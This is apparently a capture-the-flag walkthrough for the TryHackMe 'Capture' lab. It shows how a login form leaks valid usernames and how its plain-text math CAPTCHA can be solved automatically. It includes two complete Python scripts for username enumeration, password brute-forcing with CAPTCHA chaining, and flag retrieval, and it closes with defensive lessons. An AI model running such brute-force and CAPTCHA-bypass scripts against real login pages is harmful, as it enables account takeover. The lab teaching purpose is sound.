---
layout: post
title: "TryHackMe - Capture Walkthrough"
category: TryHackMe
difficulty: Easy
tags: [web, bruteforce, thm]
thumbnail: /assets/img/capture.png
---

## TryHackMe ~ Capture

**Room:** [TryHackMe ~ Capture](https://tryhackme.com/room/capture)  
**Difficulty:** Easy  
**Category:** Web, Brute Force  
**Author:** SecureSolaCoders

---

## Overview

SecureSolaCoders built an intranet login portal and got tired of hackers enumerating their login form. Instead of deploying a WAF, they rolled their own rate limiter with a math-based CAPTCHA that activates after too many failed login attempts. Your goal is to bypass this protection, enumerate valid credentials, and retrieve `flag.txt`.

---

## Setup

### Step 1 — Download the task files

On the TryHackMe room page, click the **Download Task Files** button. You will receive a zip archive containing the username and password wordlists needed for this challenge.

Extract the archive:

```bash
unzip capture.zip -d ~/ctf/tryhackme/capture
cd ~/ctf/tryhackme/capture
ls
```

You should see two files:

```bash
usernames.txt
passwords.txt
```

### Step 2 — Start the machine

Click **Start Lab Machine** on the room page and wait 3-5 minutes for it to boot. Note your target IP — referred to as `MACHINE_IP` throughout this writeup.

Connect to the TryHackMe VPN if you have not already:

```bash
sudo openvpn ~/Downloads/your-vpn-config.ovpn
```

Verify connectivity:

```bash
ping -c 3 MACHINE_IP
```

---

## Reconnaissance

### Step 3 — Nmap scan

Run a full port scan with service detection:

```bash
sudo nmap -p- -sV -sC -T4 --min-rate=5000 -A -oN scan.txt MACHINE_IP
```

Results show two open ports:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Werkzeug/2.2.2 Python/3.8.10
```

The web server is running **Werkzeug** — the WSGI toolkit that powers Flask applications. The HTTP service immediately redirects to `/login`.

### Step 4 — Web fingerprinting

```bash
whatweb http://MACHINE_IP
```

```bash
http://MACHINE_IP [302 Found] → /login
http://MACHINE_IP/login [200 OK] PasswordField[password], Werkzeug[2.2.2]
```

### Step 5 — Inspect the login page

Visit `http://MACHINE_IP/login` in your browser. You see a simple **Intranet login** form with username and password fields.

View the page source:

```bash
curl -s http://MACHINE_IP/login | grep -i "input\|form\|captcha"
```

Field names confirmed:

- `username`
- `password`
- `captcha` (appears after failed attempts)

---

## Understanding the CAPTCHA Mechanism

### Step 6 — Trigger the CAPTCHA

Submit a few wrong login attempts. After several failures the page changes:

```bash
Too many bad login attempts!
Captcha enabled

977 * 37 = ?
[ xxxx ]
```

The CAPTCHA is a **plain-text arithmetic expression** embedded directly in the HTML response — not an image. This is significant because it can be parsed and solved programmatically.

Inspect the raw captcha line:

```bash
python3 -c "
import requests, re
s = requests.Session()
for i in range(10):
    r = s.post('http://MACHINE_IP/login', data={'username':'test','password':'test'})
for line in r.text.splitlines():
    if '=' in line and '?' in line:
        print(repr(line))
"
```

Output:

```markdown
'    465 * 20 = ?'
```

### Step 7 — Understand the chaining logic

This is the critical insight. The CAPTCHA does **not** need to be solved for the request that generates it. It needs to be solved for the **next** request. The flow is:

```lua
Request N   → response contains captcha "A op B = ?"
              solve it immediately → answer
Request N+1 → send username + password + captcha=answer
              response contains NEW captcha for request N+2
```

Every response hands you the key for the next door. This means the attack must be **sequential** — threading breaks the chain because responses arrive out of order.

### Step 8 — Understand the error messages

Test what the app says for an unknown username vs a wrong password:

```bash
python3 -c "
import requests, re

url = 'http://MACHINE_IP/login'
s = requests.Session()

def solve(html):
    m = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', html)
    if not m: return None
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    return {'+': a+b, '-': a-b, '*': a*b, '/': a//b}[op]

def login(user, pwd):
    r = s.post(url, data={'username': user, 'password': pwd})
    if 'Captcha enabled' in r.text:
        ans = solve(r.text)
        r = s.post(url, data={'username': user, 'password': pwd, 'captcha': str(ans)})
    for line in r.text.splitlines():
        if 'error' in line.lower():
            print(f'[{user}] -> {line.strip()}')

print('=== FAKE USER ===')
login('fakeuser123xyz', 'fakepass')
print('=== VALID USER (after enum) ===')
login('natalie', 'fakepass')
"
```

```lua

Output reveals two distinct error messages:

[fakeuser123xyz] → Error: The user 'fakeuser123xyz' does not exist
[natalie]        → Error: Invalid password
```

This difference is the key to **username enumeration**:

- Response contains `"does not exist"` → username is invalid, skip
- Response does NOT contain `"does not exist"` → username exists, save it

---

## Exploitation

### Script 1 — bruteforce.py (Username Enum + Password Brute)

Save this as `bruteforce.py` in your working directory alongside `usernames.txt` and `passwords.txt`:

```python
#!/usr/bin/env python3
import requests, re, sys
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()
url = "http://MACHINE_IP/login"

def solve_captcha(html):
    m = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', html)
    if not m:
        return None
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    return {'+': a+b, '-': a-b, '*': a*b, '/': a//b}[op]

def warm_up(session):
    console.print("[dim][*] warming up — triggering captcha...[/]")
    r = None
    for i in range(10):
        r = session.post(url, data={"username": "test", "password": "test"})
        console.print(f"[dim]    warm-up {i+1}/10[/]", end="\r")
    console.print()
    return r

def phase1(session, usernames, last_response):
    console.print(Panel.fit(
        f"[bold green]PHASE 1 — USERNAME ENUM[/]\n"
        f"[dim]{len(usernames)} usernames · captcha-chained[/]",
        border_style="green"
    ))

    found = None
    response = last_response

    for i, username in enumerate(usernames):
        username = username.strip()
        if not username:
            continue

        ans = solve_captcha(response.text)
        data = {"username": username, "password": "test"}
        if ans is not None:
            data["captcha"] = str(ans)

        response = session.post(url, data=data)

        if "Invalid captcha" in response.text:
            console.print(f"\n[yellow][!] captcha error on {username}, skipping[/]")
            continue

        console.print(
            f"[dim][{i+1:>4}/{len(usernames)}][/] "
            f"[green]►[/] [cyan]{username:<20}[/]",
            end="\r"
        )

        if "does not exist" not in response.text:
            console.print(f"\n[bold green][+] valid username → {username}[/]")
            found = username
            break

    if not found:
        console.print("\n[red][-] no valid username found[/]")
    return found, response

def phase2(session, username, passwords, last_response):
    console.print(Panel.fit(
        f"[bold green]PHASE 2 — PASSWORD BRUTE[/]\n"
        f"[dim]user: [bold]{username}[/] · {len(passwords)} passwords[/]",
        border_style="green"
    ))

    found = None
    response = last_response

    for i, password in enumerate(passwords):
        password = password.strip()
        if not password:
            continue

        ans = solve_captcha(response.text)
        data = {"username": username, "password": password}
        if ans is not None:
            data["captcha"] = str(ans)

        response = session.post(url, data=data)

        if "Invalid captcha" in response.text:
            console.print(f"\n[yellow][!] captcha error on {password}, skipping[/]")
            continue

        console.print(
            f"[dim][{i+1:>4}/{len(passwords)}][/] "
            f"[green]►[/] [cyan]{username}[/][dim]:[/][white]{password:<20}[/]",
            end="\r"
        )

        if "Invalid password" not in response.text and "does not exist" not in response.text:
            console.print(f"\n[bold green][+] valid password → {password}[/]")
            found = password
            break

    if not found:
        console.print("\n[red][-] no valid password found[/]")
    return found

def main():
    console.print(Panel.fit(
        "[bold green]CAPTURE // BRUTEFORCE[/]\n"
        "[dim]2-phase · captcha-chained · enum first[/]",
        border_style="green"
    ))

    try:
        with open("usernames.txt") as f:
            usernames = f.readlines()
        with open("passwords.txt") as f:
            passwords = f.readlines()
    except FileNotFoundError as e:
        console.print(f"[red][-] {e}[/]")
        sys.exit(1)

    console.print(
        f"[dim]users[/] [green]{len(usernames)}[/] · "
        f"[dim]passwords[/] [green]{len(passwords)}[/] · "
        f"[dim]target[/] [green]{url}[/]\n"
    )

    session = requests.Session()
    last_response = warm_up(session)

    valid_user, last_response = phase1(session, usernames, last_response)
    if not valid_user:
        sys.exit(1)

    console.print(f"\n[green][*] found valid user: [bold]{valid_user}[/] — starting password brute[/]\n")

    valid_pass = phase2(session, valid_user, passwords, last_response)

    if valid_user and valid_pass:
        console.print(Panel(
            f"[bold green]CREDENTIALS FOUND[/]\n\n"
            f"  [dim]username[/]  [bold green]{valid_user}[/]\n"
            f"  [dim]password[/]  [bold green]{valid_pass}[/]",
            border_style="green", box=box.DOUBLE
        ))

if __name__ == "__main__":
    main()
```

Install the dependency and run:

```bash
pip install rich requests --break-system-packages
python3 bruteforce.py
```

Expected output flow:

```lua
CAPTURE // BRUTEFORCE
2-phase · captcha-chained · enum first

users 878 · passwords 1567 · target http://MACHINE_IP/login

[*] warming up — triggering captcha...
    warm-up 10/10

PHASE 1 — USERNAME ENUM
878 usernames · captcha-chained

[ 307/878] ► <VALID_USER>
[+] valid username → <VALID_USER>

PHASE 2 — PASSWORD BRUTE
user: <VALID_USER> · 1567 passwords

[ 344/1567] ► <VALID_USER>:<VALID_PASSWORD>
[+] valid password → <VALID_PASSWORD>

╔══════════════════════════╗
║ CREDENTIALS FOUND        ║
║                          ║
║  username  <VALID_USER>  ║
║  password  <VALID_PASS>  ║
╚══════════════════════════╝
```

Note the valid credentials and move to script 2.

---

### Script 2 — getflag.py (Auto-Login + Flag Retrieval)

The web GUI is unusable for manual login because the CAPTCHA refreshes between page load and form submission, making it impossible to type the correct answer in time. This script handles it programmatically.

Save this as `getflag.py` and replace `VALID_USER` and `VALID_PASS` with the credentials found above:

```python
#!/usr/bin/env python3
import requests, re
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()
url = "http://MACHINE_IP"

USERNAME = "VALID_USER"
PASSWORD = "VALID_PASS"

def solve_captcha(html):
    m = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', html)
    if not m:
        return None
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    return {'+': a+b, '-': a-b, '*': a*b, '/': a//b}[op]

def find_flag(html):
    patterns = [
        r'(THM\{[^}]+\})',
        r'(flag\{[^}]+\})',
        r'(FLAG\{[^}]+\})',
        r'([a-f0-9]{32})',
    ]
    for p in patterns:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

def main():
    console.print(Panel.fit(
        "[bold green]CAPTURE // FLAG RETRIEVAL[/]\n"
        f"[dim]user: [bold]{USERNAME}[/] · auto captcha solver[/]",
        border_style="green"
    ))

    s = requests.Session()

    # warm up to trigger captcha
    console.print("[dim][*] warming up session...[/]")
    r = None
    for i in range(10):
        r = s.post(f"{url}/login", data={"username": "test", "password": "test"})
    console.print("[dim][*] captcha active ✓[/]")

    # solve captcha from warm-up response and login
    ans = solve_captcha(r.text)
    if ans is None:
        console.print("[red][-] captcha parse failed[/]")
        return

    console.print(f"[dim][*] captcha solved → {ans}[/]")

    login_resp = s.post(f"{url}/login", data={
        "username": USERNAME,
        "password": PASSWORD,
        "captcha": str(ans)
    }, allow_redirects=True)

    console.print(f"[dim][*] status  → {login_resp.status_code}[/]")
    console.print(f"[dim][*] landed  → {login_resp.url}[/]")

    # search for flag in landing page
    flag = find_flag(login_resp.text)

    # spider links if not found on landing page
    if not flag:
        console.print("[dim][*] spidering links...[/]")
        links = re.findall(r'href=["\']([^"\']+)["\']', login_resp.text)
        for link in links:
            full = link if link.startswith("http") else url + link if link.startswith("/") else None
            if not full:
                continue
            page = s.get(full)
            flag = find_flag(page.text)
            if flag:
                break

    # dump page text if flag pattern not matched
    if not flag:
        console.print("\n[yellow][!] flag pattern not matched — raw page content:[/]\n")
        clean = re.sub(r'<[^>]+>', '', login_resp.text)
        clean = re.sub(r'\s+', ' ', clean).strip()
        console.print(f"[white]{clean}[/]")
    else:
        console.print(Panel(
            f"[bold green]FLAG CAPTURED[/]\n\n"
            f"  [dim]flag[/]  [bold green]{flag}[/]",
            border_style="green", box=box.DOUBLE
        ))

if __name__ == "__main__":
    main()
```

Run it:

```bash
python3 getflag.py
```

The script will log in, follow redirects to the dashboard, extract the flag, and print it.

---

## Why Manual Login Fails

When you load the login page in a browser, the server generates a captcha tied to your session. By the time you read the equation, type the answer, and click submit, the server has already rotated to a new captcha — so your answer is always stale. The script avoids this by solving the captcha from the **previous response** and submitting the answer in the **very next request** with no delay.

---

## Key Takeaways

**Username enumeration via error message difference** — the application returns distinct error messages for unknown users vs wrong passwords. This is an OWASP-documented vulnerability. A secure implementation should always return the same generic message regardless of which field is wrong.

**Arithmetic CAPTCHA is not protection** — a CAPTCHA that is delivered as plain text in the HTML body is trivially solvable by any script that can parse a regex. Image-based CAPTCHAs or server-side rate limiting with IP blocking would be significantly harder to bypass.

**Captcha chaining** — the CAPTCHA is session-tied and rotates on every request. The correct approach is to solve the captcha from response N and send the answer with request N+1, not to re-fetch the page mid-loop.

**Threading breaks captcha chains** — multithreading was attempted but failed here because the captcha must be consumed in strict sequential order. The correct attack is single-threaded and chained.

---

## Flag

```bash
flag.txt → <REDACTED>
```

Submit the value from `flag.txt` on the TryHackMe room page to complete the challenge.
